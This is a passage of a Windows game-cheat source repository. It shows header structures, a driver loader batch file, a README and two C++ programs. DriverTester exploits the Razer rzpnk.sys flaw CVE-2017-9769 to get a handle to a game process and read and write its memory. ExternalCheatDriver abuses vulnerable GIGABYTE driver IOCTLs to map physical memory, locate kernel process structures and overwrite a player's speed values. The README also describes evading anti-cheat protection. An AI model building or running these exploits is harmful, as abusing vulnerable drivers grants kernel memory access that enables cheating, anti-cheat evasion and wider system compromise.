- static ULONG64 findPhisical_ObjectTable(DWORDLONG startAddress, DWORDLONG stopAddress, DWORD searchSpace, PBYTE  searchBuffer, DWORD bufferSize);
- static DWORDLONG findPhisical(DWORDLONG startAddress, DWORDLONG stopAddress, DWORD searchSpace, PBYTE  searchBuffer, DWORD bufferSize);


## Usefull Structures:

EPROCESS pattern:
```
typedef struct {
	CHAR  ImageFileName[15];
	DWORD PriorityClass;
} _EPROCESS_PATTERN;
```

Read physicalAddress:
```
typedef struct _READ_REQUEST {
	DWORD InterfaceType;
	DWORD Bus;
	ULONG64 PhysicalAddress;
	DWORD IOSpace;
	DWORD size;
} READ_REQUEST;
```

Write physicalAddress:
```
typedef struct _WRITE_REQUEST {
	DWORDLONG address;
	DWORD length;
	DWORDLONG buffer;
} WRITE_REQUEST;
```

Structure for memcpy using VA:
```
typedef struct _MEMCPY_REQUEST {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} MEMCPY_REQUEST;
```

HANDLE_TABLE_ENTRY:
```
typedef struct _HANDLE_TABLE_ENTRY
{
	ULONGLONG Value;
	ULONGLONG GrantedAccess : 25;
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;
```

HANDLE_TABLE:_
```
typedef struct _HANDLE_TABLE
{
	CHAR fill[100];
} HANDLE_TABLE, *PHANDLE_TABLE;
```
```

`DriverHelper/stdafx.cpp`:

```cpp
#include "stdafx.h"

```

`DriverHelper/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers



// reference additional headers your program requires here

```

`DriverHelper/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`DriverTester/DriverTester.cpp`:

```cpp
// DriverTester.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

DWORD targetPid = NULL;
PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

typedef NTSTATUS(WINAPI *fn_NtDeviceIoControlFile)(
	__in HANDLE FileHandle,
	__in HANDLE Event,
	__in PIO_APC_ROUTINE ApcRoutine,
	__in PVOID ApcContext,
	__out PIO_STATUS_BLOCK IoStatusBlock,
	__in ULONG IoControlCode,
	__in PVOID InputBuffer,
	__in ULONG InputBufferLength,
	__out PVOID OutputBuffer,
	__in ULONG OutputBufferLength
);

fn_NtDeviceIoControlFile NtDeviceIoControlFileInstance;

struct buffer {
	INT64 pid1;
	INT64 pid2;
} inB, outB;

HANDLE hTarget = NULL;


bool ExploitRazerDriver() {
	HANDLE hDevice = CreateFile("\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095", FILE_SHARE_WRITE | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "INVALID_HANDLE_VALUE: " << GetLastError() << std::endl;
		return 1;
	}

	
	HANDLE targetHandle = NULL;

	HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
	if (hNtDll == NULL)
	{
		std::cout << "GetModuleHandleW!\n";
	}

	NtDeviceIoControlFileInstance = (fn_NtDeviceIoControlFile)GetProcAddress(hNtDll, "NtDeviceIoControlFile");

	DWORD returnedBytes = 0; 
	memset(&inB, 0, sizeof(buffer));
	memset(&outB, 0, sizeof(buffer));
	inB.pid1 = targetPid;

	DeviceIoControl(hDevice, 0x22a050, &inB, sizeof(buffer), &outB, sizeof(buffer), &returnedBytes, NULL);
	if (returnedBytes == 0)
	{
		std::cout << "[-] Exploit failed: " << std::hex << GetLastError() << std::endl;
	};

	std::cout << "[+] Target process PID: " << std::hex << outB.pid1 << std::endl;
	std::cout << "[+] Target handle: " << std::hex << outB.pid2 << std::endl;
	hTarget = (HANDLE)outB.pid2;
	return 0;
}



void handleTests(HANDLE handle)
{
	SIZE_T stRead = 0;
	SIZE_T stWrite = 0;

	PMRequest.action = 1;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::RPM((HANDLE)handle, (LPCVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, NULL);

	PMRequest.action = 2;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::WPM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 4;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::NtRVM((HANDLE)handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, NULL);


	PMRequest.action = 5;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::NtWVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 6;
	CheatHelper::prepareRequest(PMRequest);
	CheatHelper::ZwRVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 7;
	CheatHelper::prepareRequest(PMRequest);
	CheatHelper::ZwWVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);


}



int main()
{
	
	std::cout << "[+] Init\n";
	CheatHelper::loadConfig();

	std::cout << "[+] Waiting for target process\n";
	while (true)
	{
		targetPid = CheatHelper::GetProcId(CheatHelper::targetProc);
		if (targetPid != NULL)
		{
			std::cout << "[+] PID: 0x" << std::dec << targetPid << std::endl;
			break;//
		}
		Sleep(1000);
	}

	PMRequest.address = 0x0;
	SecureZeroMemory(PMRequest.buffer, BUFSIZE - 1);
	PMRequest.size = 0x0;
	// Connecting the vulnerable driver (Razer Synapse rzpnk.sys ZwOpenProcess - ZwOpenProcess)
	ExploitRazerDriver();

	handleTests(hTarget);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

```

`DriverTester/DriverTester.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{D3FF3C48-32D5-4B7A-83EA-22DFE29B5E11}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>DriverTester</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>$(VC_IncludePath);$(WindowsSDK_IncludePath);</IncludePath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(VCInstallDir)lib;C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64;%(AdditionalLibraryDirectories);</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DriverTester.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="LoadDriver.bat" />
    <None Include="Readme.md" />
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DriverTester/DriverTester.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DriverTester.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="LoadDriver.bat">
      <Filter>Source Files</Filter>
    </None>
    <None Include="Readme.md" />
  </ItemGroup>
</Project>
```

`DriverTester/LoadDriver.bat`:

```bat
sc create DriverTester binpath= "..\resources\rzpnk.sys" type= kernel
sc start DriverTester
```

`DriverTester/Readme.md`:

```md
# DriverTester

## Introduction


## Usage

This module exploits **Razer Synapse rzpnk.sys (2.20.15.1104) - CVE-2017-9769** to open a new HANDLE to the game from kernel mode. Then it attempts to access to the memory of the game by using this handle.

> A specially crafted IOCTL can be issued to the rzpnk.sys driver in Razer Synapse 2.20.15.1104 that is forwarded to ZwOpenProcess allowing a handle to be opened to an arbitrary process.
References

__Actions that this module attemps:__

-  ReadProcessMemory
-  WriteProcessMemory
-  ntReadVirtualMemory
-  ntWriteVirtualMemory
-  ZwReadVirtualMemory
-  ZwWriteVirtualMemory

## Configuration

This module requires configuration:

- The following variables in config.ini need to the provided:

[Addresses]
```
RPMAddressHigh=0x1
RPMAddressLow=0x58A60000
RPMAddress=0x0
WPMAddressHigh=0x00000000
WPMAddressLow=0x58A60000
WPMAddress=0x0
ntRVMAddressHigh=0x00000000
ntRVMAddressLow=0x58A60000
ntRVMAddress=0x0
ntWVMAddressHigh=0x00000000
ntWVMAddressLow=0x58A60000
ntWVMAddress=0x0
ZwRVMAddressHigh=0x00000000
ZwRVMAddressLow=0x58A60000
ZwRVMAddress=0x0
ZwWVMAddressHigh=0x00000000
ZwWVMAddressLow=0x58A60000
ZwWVMAddress=0x0
```


[Buffers]
```
#SIZE MUST BE SIZE+1
RPMBuffer=TTTT1
RPMBufferSize=0x6
WPMBuffer=TTTT2
WPMBufferSize=0x6
ntRVMBuffer=TTTT4
ntRVMBufferSize=0x6
ntWVMBuffer=TTTT5
ntWVMBufferSize=0x6
ZwRVMBuffer=TTTT6
ZwRVMBufferSize=0x6
ZwWVMBuffer=TTTT7
ZwWVMBufferSize=0x6
``` 

[Strings]
```
targetProc=r5apex.exe
```

## Combination with other techniques

- **RUNASKINVOKER**: By executing the game using this options we will prevent the Anti-cheat to fully protect the game end load the driver.


## Links

https://warroom.rsmus.com/cve-2017-9769/
```

`DriverTester/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`DriverTester/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`ExternalCheatDriver/ExternalCheatDriver.cpp`:

```cpp
// ExternalCheatDriver.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include "CheatHelper.h"
#include "DriverHelper.h"
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <cstdint>



// Definition of IOCTL numbers
// GPCIDrv64 Driver
#define IOCTL_MAPPHYSICAL	0x9C402580
#define IOCTL_UNMAPPHYSICAL	0x9C402584
// GIO Driver
#define IOCTL_GIO_MAPPHYSICAL	0xC3502004
#define IOCTL_GIO_UNMAPPHYSICAL 0xC3502008
#define IOCTL_GIO_MEMCPY 0xC3502808

// Kernel offsets
// W10
#define OFFSET_IMAGEFILENAME 0x450
#define OFFSET_OBJECTTABLE 0x418

#pragma comment(lib, "ntdll.lib")


ULONG64 GIO_mapPhysical(ULONG64 physicaladdress, DWORD size)
{
	READ_REQUEST inbuffer = { 0, 0, physicaladdress, 0, size };
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_MAPPHYSICAL,
		&inbuffer,
		sizeof(inbuffer),
		&outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

ULONG64 GIO_unmapPhysical(ULONG64 address)
{
	ULONG64 inbuffer = address;
	ULONG64 outbuffer[2] = { 0 };
	DWORD bytes_returned = 0;
	DeviceIoControl(DriverHelper::hDeviceDrv,
		IOCTL_GIO_UNMAPPHYSICAL,
		(LPVOID)&inbuffer,
		sizeof(inbuffer),
		(LPVOID)outbuffer,
		sizeof(outbuffer),
		&bytes_returned,
		(LPOVERLAPPED)NULL);

	return outbuffer[0];
}

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	MEMCPY_REQUEST mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(DriverHelper::hDeviceDrv, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}

bool bFirstActivation = true;

bool ActivateHack(uintptr_t speedAddress, uintptr_t attackSpeedAddress, boolean activate, int32_t &initialSpeed, int32_t &initialAttackSpeed)
{
	if (activate)
	{
		if (bFirstActivation)
		{
			std::cout << "[+] Activating Hack" << std::endl;
			std::cout << "\t[+] PlayerSpeed Address:\t 0x" << std::hex << speedAddress << std::endl;
			std::cout << "\t[+] PlayerAttackSpeed Address:\t 0x" << std::hex << attackSpeedAddress << std::endl;

			if (!DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
				speedAddress,
				&initialSpeed, sizeof(initialSpeed), NULL))
			{
				std::cout << "[-] Reading PlayerSpeed: Failed" << std::endl;
				return false;
			}

			if (!DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
				attackSpeedAddress,
				&initialAttackSpeed, sizeof(initialAttackSpeed), NULL))
			{
				std::cout << "[-] Reading PlayerAttackSpeed: Failed" << std::endl;
				return false;
			}

			std::cout << "\t[+] Current PlayerSpeed:\t 0x" << std::hex << initialSpeed << std::endl;
			std::cout << "\t[+] Current PlayerAttackSpeed:\t 0x" << std::hex << initialAttackSpeed << std::endl;
		}

		int32_t newSpeed = (std::numeric_limits<std::int32_t>::max)();
		int32_t newAttackSpeed = 9999999;
			
		if (!DriverHelper::WriteVirtualMemory(DriverHelper::DTBTargetProcess,
			speedAddress,
			&newSpeed, sizeof(newSpeed), NULL))
		{
			std::cout << "[-] Activating SpeedHack: Failed" << std::endl;
			return false;
		}
		if (!DriverHelper::WriteVirtualMemory(DriverHelper::DTBTargetProcess,
			attackSpeedAddress,
			&newAttackSpeed, sizeof(newAttackSpeed), NULL))
		{
			std::cout << "[-] Activating AttackSpeedHack: Failed" << std::endl;
			return false;
		}

		if (bFirstActivation)
		{
			std::cout << "\t[+] Current PlayerSpeed:\t 0x" << std::hex << newSpeed << std::endl;
			std::cout << "\t[+] Current PlayerAttackSpeed:\t 0x" << std::hex << newAttackSpeed << std::endl;
		}
	}
	else
	{
		std::cout << "[+] Deactivating Hack" << std::endl;

		int32_t currentSpeed = 0;
		int32_t currentAttackSpeed = 0;

		if (!DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
			speedAddress,
			&currentSpeed, sizeof(currentSpeed), NULL))
		{
			std::cout << "[-] Deactivating SpeedHack: Failed" << std::endl;
			return false;
		}
		if (!DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
			attackSpeedAddress,
			&currentAttackSpeed, sizeof(currentAttackSpeed), NULL))
		{
			std::cout << "[-] Deactivating AttackSpeedHack: Failed" << std::endl;
			return false;
		}

		std::cout << "\t[+] Current PlayerSpeed:\t 0x" << std::hex << currentSpeed << std::endl;
		std::cout << "\t[+] Current AttackPlayerSpeed:\t 0x" << std::hex << currentAttackSpeed << std::endl;

		if (!DriverHelper::WriteVirtualMemory(DriverHelper::DTBTargetProcess,
			speedAddress,
			&initialSpeed, sizeof(initialSpeed), NULL))
		{
			std::cout << "[-] Deactivating SpeedHack: Failed" << std::endl;
			return false;
		}
		if (!DriverHelper::WriteVirtualMemory(DriverHelper::DTBTargetProcess,
			attackSpeedAddress,
			&initialAttackSpeed, sizeof(initialAttackSpeed), NULL))
		{
			std::cout << "[-] Deactivating AttackSpeedHack: Failed" << std::endl;
			return false;
		}

		std::cout << "\t[+] Current PlayerSpeed:\t 0x" << std::hex << initialSpeed << std::endl;
		std::cout << "\t[+] Current AttackPlayerSpeed:\t 0x" << std::hex << initialAttackSpeed << std::endl;

	}
	
	bFirstActivation = false;

	return true;
}


int main()
{
	std::cout << "[+] Init" << std::endl;
	CheatHelper::loadConfig();


	// Connecting the vulnerable driver (GPCIDrv64.sys AORUS GRAPHICS ENGINE v1.25)
	std::cout << "[+] Obtaining HANDLE to Drv" << std::endl;
	if (DriverHelper::getDeviceHandle(CheatHelper::driverName))
	{
		std::cout << "[-] Obtaining HANDLE: failed." << std::endl;
		return 1;
	}

	// If we want to change the driver, we just need to create our functions for communication and set the following variables
	DriverHelper::fn_memcpy = (_fn_memcpy)GIO_memcpy;
	DriverHelper::fn_mapPhysical = (_fn_mapPhysical)GIO_mapPhysical;
	DriverHelper::fn_unmapPhysical = (_fn_unmapPhysical)GIO_unmapPhysical;

	uintptr_t directoryTableBase = 0;
	uintptr_t pKProcess = DriverHelper::GetKProcess(directoryTableBase);

	uintptr_t pBaseAddress = DriverHelper::SearchKProcess(CheatHelper::targetProc, directoryTableBase, pKProcess);

	if (!DriverHelper::ObtainKProcessInfo(directoryTableBase, pBaseAddress))
	{
		std::cout << "[-] ObtainKProcessInfo failed" << std::endl;
	}

	//	objectTable	0xcccccccccccccccc	unsigned __int64
	if (pBaseAddress == 0)
	{
		std::cout << "[-] Target process not found :(" << std::endl;
		return 1;
	}
	
	if (!DriverHelper::CheckProcessHeader(DriverHelper::DTBTargetProcess,
		DriverHelper::pBaseAddressTargetProcess))
	{
		std::cout << "[-] Failed process header checking" << std::endl;
		return 1;
	}
	
	std::cout << "[+] Process Header Check: SUCCESS" << std::endl;
	
	bool activate = true;

	// From this part you will need to customize everything
	// This is just a practical example to show how it is possible to validate if the
	// memory of a game is accessible with this techinque
	uintptr_t localPlayerOffset = 0x390d858;
	uintptr_t speedAddressOffset = 0xB58;
	uintptr_t attackSpeedAddressOffset = 0xB5C;
	uintptr_t speedAddress = 0;
	uintptr_t attackSpeedAddress = 0;
	uintptr_t playerAddress = 0;

	playerAddress = DriverHelper::pBaseAddressTargetProcess + localPlayerOffset;

	uintptr_t pLocalPlayer = 0;

	std::cout << "[+] Locating localPlayer Address" << std::endl;
	if (!DriverHelper::ReadVirtualMemory(DriverHelper::DTBTargetProcess,
			playerAddress,
			&pLocalPlayer, sizeof(pLocalPlayer), NULL))
	{
			std::cout << "[-] Obtaining localPlayer: Failed" << std::endl;
			return false;
	}

	std::cout << "\t[+] localPlayerAddress: 0x" << std::hex << playerAddress << std::endl;

	speedAddress = pLocalPlayer + speedAddressOffset;
	attackSpeedAddress = pLocalPlayer + attackSpeedAddressOffset;

	int32_t initialSpeed = 0;
	int32_t initialAttackSpeed = 0;

	// Activating Cheat
	if (!ActivateHack(speedAddress, attackSpeedAddress, activate, initialSpeed, initialAttackSpeed))
		return 1;

	// We need this while to lock the value we want on memory. The game could change the value anytime
	// and we have to overwrite it.
	while (true)
	{
		// InsertKey to disable cheat
		if (GetKeyState(VK_INSERT) & 0x8000)
			break;

		if (!ActivateHack(speedAddress, attackSpeedAddress, activate, initialSpeed, initialAttackSpeed))
			return 1;

		Sleep(100);
	}
	
	// Deactivating cheat
	activate = false;
	if (!ActivateHack(speedAddress, attackSpeedAddress, activate, initialSpeed, initialAttackSpeed))
		return 1;

	return 0;

}
```

`ExternalCheatDriver/ExternalCheatDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release2|Win32">
      <Configuration>Release2</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release2|x64">
      <Configuration>Release2</Configuration>
